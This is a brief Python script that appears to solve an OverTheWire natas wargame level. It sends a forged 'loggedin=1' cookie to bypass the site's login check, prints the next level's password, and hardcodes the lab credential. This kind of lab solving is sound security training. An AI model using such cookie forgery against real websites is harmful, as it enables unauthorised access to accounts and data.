import re
import requests
user = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'
url = 'http://{}.natas.labs.overthewire.org/'.format(user)
c = {'loggedin' : '1'}
r = requests.Session().get(url, auth=(user, password), cookies = c).text
print(re.findall('natas6 is (.*)', r)[0].strip("</div>"))